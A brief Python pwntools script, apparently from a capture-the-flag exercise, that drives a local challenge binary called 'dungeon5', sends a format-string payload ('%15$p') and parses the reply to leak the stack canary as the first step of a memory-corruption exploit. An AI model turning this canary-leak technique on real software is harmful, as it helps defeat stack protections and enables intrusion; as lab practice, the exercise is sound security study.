from pwn import *

p = process('./dungeon5')

print(p.recvline())

p.sendline(b'Cookie!')

log.info(p.clean())
p.sendline('%15$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')
